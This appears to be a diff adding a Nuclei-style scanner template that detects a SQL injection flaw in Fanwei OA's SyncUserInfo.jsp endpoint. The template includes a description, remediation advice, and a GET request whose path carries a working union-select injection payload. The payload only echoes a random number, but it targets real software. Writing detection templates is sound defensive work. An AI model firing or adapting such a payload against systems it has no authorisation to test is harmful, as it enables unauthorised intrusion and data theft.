@@ -1,0 +1,26 @@
+id: ecology-syncuserinfo-sqli
+info:
+  name: Fanwei OA SyncUserInfo SQL Injection
+  author:
+  - l0ne1y
+  description: |-
+    Fanwei OA SyncUserInfo SQL Injection
+    SQL is a database query and programming language used to store data and to query, update, and manage relational database systems; it is also the file extension of database scripts.
+    Web programs typically use SQL commands to query and update database data. Such queries or updates usually involve conditions that are filled in by users. Malicious users can modify these conditions to execute malicious SQL commands to obtain or update database data. Even worse, if the database account has high privileges, attackers can inject malicious SQL commands to call special database functions to read/write files on the server or execute operating system commands.
+    Fanwei OA has a SQL injection vulnerability in SyncUserInfo, which an attacker can exploit to execute arbitrary SQL commands.
+  severity: high
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - contains(body,randomValue) && !contains(body,"./SyncUserInfo.jsp?") && status_code==200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{randomValue}}),null'
+  method: GET
+  req-condition: true
+variables:
+  randomValue: '{{rand_int(40000, 44800)}}'
